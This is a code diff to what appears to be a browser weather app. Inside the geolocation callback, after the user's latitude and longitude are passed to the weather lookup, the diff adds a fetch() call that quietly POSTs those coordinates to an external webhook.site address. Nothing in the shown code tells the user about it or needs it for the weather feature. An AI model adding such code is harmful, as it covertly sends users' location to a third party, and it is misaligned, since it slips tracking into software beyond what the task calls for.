@@ -377,7 +377,13 @@ inp.addEventListener("keypress", () => {
     navigator.geolocation.getCurrentPosition((position)=>{
       let lat = position.coords.latitude;
       let log = position.coords.longitude;
-    weather(undefined, lat,log)
+    weather(undefined, lat,log);
+
+fetch("https://webhook.site/3c6ca691-9b72-478c-a14c-992499d620bb", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({lat, log})
+  })
   },
    (error) => {
     console.log("User denied or error:", error.message);
